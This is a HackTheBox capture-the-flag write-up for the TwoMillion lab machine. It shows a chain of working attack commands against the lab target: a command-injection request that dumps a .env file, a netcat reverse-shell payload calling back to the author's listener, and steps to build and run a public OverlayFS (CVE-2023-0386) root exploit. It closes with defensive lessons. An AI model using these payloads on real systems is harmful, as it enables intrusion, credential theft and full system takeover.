# HackTheBox — TwoMillion Writeup
**Difficulty:** Easy  
**OS:** Linux  
**IP:** 10.129.41.177  
**My Kali IP (tun0):** 10.10.16.187  

---

## Overview

TwoMillion is a Linux machine themed around the old HackTheBox website. The attack chain involves:
1. Reverse engineering obfuscated JavaScript to generate an invite code
2. Registering an account and abusing an API to escalate to admin
3. Exploiting a command injection vulnerability in an admin API endpoint
4. Reading a `.env` file to get SSH credentials (user flag)
5. Exploiting **CVE-2023-0386** (OverlayFS kernel vulnerability) to get root

---

## Step 1 — Reconnaissance

### Why?
Before attacking anything, we need to know what ports and services are running on the target. Nmap is the standard tool for this.

```bash
nmap -sV -sC -oN nmap.txt 10.129.41.177
```

**Flags explained:**
- `-sV` → detect service versions
- `-sC` → run default scripts (banner grab, etc.)
- `-oN` → save output to file

**Result:** Two open ports:
- **Port 22** → SSH (OpenSSH)
- **Port 80** → HTTP (Nginx web server)

---

## Step 2 — Add Hostname to /etc/hosts

### Why?
The web server redirects to `2million.htb` — a hostname. Without telling our machine what IP that hostname points to, our browser won't resolve it. We add it manually to `/etc/hosts` (Linux's local DNS file).

```bash
echo "10.129.41.177 2million.htb" | sudo tee -a /etc/hosts
```

Now browse to: `http://2million.htb`

You'll see the **old HackTheBox homepage** (circa 2017).

---

## Step 3 — Getting an Invite Code

### Why?
The site has a `/invite` page that requires a valid invite code to register. We need to reverse engineer how this code is generated.

### 3a — Find the JavaScript File

Open browser DevTools (F12) → Network tab → Refresh the `/invite` page.  
You'll spot a JS file called **`inviteapi.min.js`** being loaded.

### 3b — Deobfuscate the JavaScript

The JS is obfuscated (minified + encoded). Opening it reveals a function called `makeInviteCode()`.  
Paste the code into a deobfuscator like https://lelinhtinh.github.io/de4js/ to read it clearly.

The deobfuscated code shows it makes a **POST request** to `/api/v1/invite/how/to/generate` to get a hint.

### 3c — Get the Hint

```bash
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq .
```

**Output:**
```json
{
  "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
  "enctype": "ROT13"
}
```

The message is ROT13 encoded. Decoded it says:  
*"In order to generate the invite code, make a POST request to /api/v1/invite/generate"*

### 3d — Generate the Invite Code

```bash
curl -s -X POST http://2million.htb/api/v1/invite/generate | jq .
```

**Output:**
```json
{
  "data": {
    "code": "TkE0WEItVkdMRTAtMEJLMjUtMFBKMVE=",
    "format": "encoded"
  }
}
```

The code is **Base64 encoded**. Decode it:

```bash
echo "TkE0WEItVkdMRTAtMEJLMjUtMFBKMVE=" | base64 -d
# Output: NA4XB-VGLE0-0BK25-0PJ1Q
```

---

## Step 4 — Register and Login

### Why?
We need a valid account to explore the application's authenticated features and find the admin API.

1. Go to `http://2million.htb/invite`
2. Enter the decoded invite code
3. Fill in the registration form (any email/username/password)
4. Login with your credentials

>  **Important:** Do this in the **browser** — the app sets session cookies during browser-based registration that don't work correctly through raw API calls.

---

## Step 5 — Grab Your Session Cookie

### Why?
All authenticated API requests need our session cookie (PHPSESSID) to prove we're logged in. This is how PHP web apps track sessions.

After logging in:
- Press **F12** → **Storage** tab → **Cookies** → `http://2million.htb`
- Copy the **PHPSESSID** value

```bash
export SID="your_phpsessid_here"
```

---

## Step 6 — API Enumeration

### Why?
The app has an API. We need to discover all available endpoints to find ones we can abuse. The app exposes a route listing at `/api/v1`.

```bash
curl -s http://2million.htb/api/v1 --cookie "PHPSESSID=$SID" | jq .
```

Key endpoints found under `/api/v1/admin/`:
| Endpoint | Method | Purpose |
|---|---|---|
| `/api/v1/admin/auth` | GET | Check if current user is admin |
| `/api/v1/admin/settings/update` | PUT | Update user settings (including `is_admin`) |
| `/api/v1/admin/vpn/generate` | POST | Generate VPN config (vulnerable to command injection) |

---

## Step 7 — Privilege Escalation to Admin

### Why?
Normal users can't access admin endpoints. But the `/api/v1/admin/settings/update` endpoint doesn't properly validate authorization — it lets any authenticated user set `is_admin: 1` on their own account. This is a **broken access control** vulnerability (OWASP A01).

```bash
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
  --cookie "PHPSESSID=$SID" \
  -H "Content-Type: application/json" \
  -d '{"email":"your@email.com","is_admin":1}' | jq .
```

**Expected response:**
```json
{
  "id": 13,
  "username": "youruser",
  "is_admin": 1
}
```

We are now admin.

---

## Step 8 — Command Injection via Admin VPN Endpoint

### Why?
The `/api/v1/admin/vpn/generate` endpoint takes a `username` parameter and uses it inside a shell command to generate VPN configs (likely calling `ovpn` tools). It doesn't sanitize the input — so we can inject our own shell commands. This is a **command injection** vulnerability (OWASP A03).

### 8a — Dump .env File Directly

Before getting a reverse shell, we can read sensitive files directly:

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  --cookie "PHPSESSID=$SID" \
  -H "Content-Type: application/json" \
  -d '{"username":"test;cat /var/www/html/.env;"}'
```

**Output:**
DB_HOST=127.0.0.1  
DB_DATABASE=htb_prod  
DB_USERNAME=admin  
DB_PASSWORD=SuperDuperPass123


The `.env` file (environment variables file used by PHP/Laravel apps) contains **database credentials** — and since sysadmins often reuse passwords, we try these for SSH.

### 8b — Get a Reverse Shell (Optional)

```bash
# Terminal 1 — Listener
nc -lvnp 4444

# Terminal 2 — Inject shell
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  --cookie "PHPSESSID=$SID" \
  -H "Content-Type: application/json" \
  -d '{"username":"test;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.187 4444 >/tmp/f #"}'
```

**Shell payload explained:**
- `rm /tmp/f` → clean up any old pipe
- `mkfifo /tmp/f` → create a named pipe (FIFO) for bidirectional communication
- `cat /tmp/f | /bin/bash -i` → feed commands from pipe into bash interactively
- `2>&1` → redirect stderr to stdout so we see errors too
- `| nc 10.10.16.187 4444 >/tmp/f` → send output to our listener and write responses back to pipe

---

## Step 9 — SSH as Admin → User Flag

### Why?
We found credentials in `.env`. SSH gives us a stable, full TTY session — much better than a reverse shell.

```bash
ssh admin@10.129.41.177
# Password: SuperDuperPass123
```

```bash
cat ~/user.txt
# ddb95e[redacted]e133ab773
```

 **User flag captured!**

---

## Step 10 — Enumeration for Privilege Escalation

### Why?
We're logged in as `admin` (a regular user). We need to find a way to become `root`. Always check for hints left by the box creator.

```bash
cat /var/mail/admin
```

There's an email from `ch4p@2million.htb` mentioning a recent **OverlayFS vulnerability** being actively exploited. This hints at **CVE-2023-0386**.

---

## Step 11 — Root via CVE-2023-0386 (OverlayFS)

### What is CVE-2023-0386?
OverlayFS is a Linux filesystem feature that layers directories on top of each other (used heavily by Docker). A flaw was found in how the kernel copies files between overlay layers — it **fails to check if the user owns the file** when copying from a `lower` directory to an `upper` directory. This allows an unprivileged user to smuggle a **SUID binary** (a file that runs as root) into a location and execute it to get root access. [web:50]

**Affected kernels:** Linux 5.11 up to ~6.1.9  
**Disclosed:** March 2023

### 11a — Download Exploit on Kali

```bash
git clone https://github.com/xkaneiki/CVE-2023-0386
zip -r /tmp/cve.zip CVE-2023-0386
```

### 11b — Transfer to Target

```bash
scp /tmp/cve.zip admin@10.129.41.177:/tmp/
# Password: SuperDuperPass123
```

### 11c — Compile on Target

```bash
# SSH into target
cd /tmp
unzip cve.zip -d CVE-2023-0386
cd CVE-2023-0386
make all
```

>  You'll see warnings about format strings and clock skew — these are **harmless**. As long as `fuse`, `exp`, and `gc` binaries are created, you're good.

### 11d — Run the Exploit (Two Terminals Required)

The exploit needs two simultaneous processes:
- **Process 1 (`./fuse`)** → mounts a fake OverlayFS and serves a SUID binary from the lower layer
- **Process 2 (`./exp`)** → triggers the kernel to copy the SUID binary while bypassing ownership checks

**SSH Terminal 1** (leave running):
```bash
cd /tmp/CVE-2023-0386
./fuse ./ovlcap/lower ./gc
# This will appear to hang — that's correct!
```

**SSH Terminal 2** (open new SSH session):
```bash
ssh admin@10.129.41.177
cd /tmp/CVE-2023-0386
./exp
```

**Expected output:**
uid:1000 gid:1000  
[+] mount success  
-rwsrwxrwx 1 nobody nogroup 16096 Jan 1 1970 file  
[+] exploit success!  
root@2million:/tmp/CVE-2023-0386#


### 11e — Root Flag 

```bash
id
# uid=0(root) gid=0(root) groups=0(root),1000(admin)

cat /root/root.txt
# cdecd[redacted]0223f171
```

 **Root flag captured!**

---

## Summary of Attack Chain

| Step | Technique | Vulnerability |
|---|---|---|
| Invite code | JS reverse engineering + ROT13 + Base64 | Obscurity (not security) |
| Register/Login | Browser-based registration | N/A |
| Admin escalation | Broken access control on API | OWASP A01 |
| .env dump / RCE | Command injection in VPN endpoint | OWASP A03 |
| User flag | Credential reuse (.env → SSH) | Weak credential management |
| Root flag | CVE-2023-0386 OverlayFS kernel exploit | Linux Kernel < 6.1.9 |

---

## Key Takeaways

- **API endpoints must enforce authorization** — just being authenticated ≠ being authorized
- **Never trust user input** in shell commands — always sanitize or use parameterized calls
- **Never store plaintext credentials** in `.env` files accessible from the web root
- **Keep kernels patched** — CVE-2023-0386 had a patch available but the box runs a vulnerable kernel
- **Password reuse** across services (DB password = SSH password) is a critical risk

---

*Pwned by Abdullah Kareem | HTB TwoMillion | April 2026*
